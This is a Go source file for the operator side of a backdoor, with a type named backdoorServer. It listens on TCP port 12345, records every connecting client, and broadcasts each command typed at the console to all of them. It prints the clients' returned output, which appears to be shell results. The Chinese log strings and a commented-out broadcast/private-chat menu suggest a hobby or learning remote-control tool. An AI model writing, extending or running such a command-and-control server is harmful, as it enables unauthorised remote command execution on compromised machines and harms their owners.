package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

var OnlineMap map[string]net.Conn

type backdoorServer struct {
	s *Server
}

func (t *backdoorServer) OnAccept(conn net.Conn) bool {
	fmt.Println("收到来自" + conn.RemoteAddr().String() + "的连接")
	OnlineMap[conn.RemoteAddr().String()] = conn
	return true
}
func (t *backdoorServer) OnData(conn net.Conn, cmd, ext uint16, data []byte) error {
	if cmd == 0 && ext == 0 {
		return nil
	}
	//psout
	if cmd == 3 && ext == 3 {
		fmt.Println(string(data))
	}

	return nil
}
func (t *backdoorServer) OnRecvError(conn net.Conn, err error) {
	fmt.Printf("err: %v\n", err)
	fmt.Println("youcuowu")
}
func (t *backdoorServer) OnClientClose(conn net.Conn) {}
func main() {
	OnlineMap = make(map[string]net.Conn, 20)

START:
	a := &backdoorServer{}
	server, err := Listen("tcp", "0.0.0.0:12345")

	if err != nil {
		goto START
	}
	go server.Run(a)
	menu(server)
}
func (t *Server) broadcastcmd(cmd string) {
	for _, x := range OnlineMap {

		t.Send(x, 1, 1, []byte(cmd))
		//fmt.Println("发送" + name)
	}
}
func menu(server *Server) {
	for {
		// fmt.Println("选择模式:\n(1)广播模式\n(2)私聊模式\n")
		// var ind int
		// fmt.Scanf("%d", &ind)
		// switch ind {
		// case 1:
		// 	for {
		// 		fmt.Scan()
		// 		input, err := bufio.NewReader(os.Stdin).ReadString('\n')
		// 		if err != nil {
		// 			panic(err)
		// 		}
		// 		server.broadcastcmd(input)
		// 	}

		// }
		for {
			fmt.Scan()
			input, err := bufio.NewReader(os.Stdin).ReadString('\n')
			if err != nil {
				panic(err)
			}
			server.broadcastcmd(input)
		}

	}
}
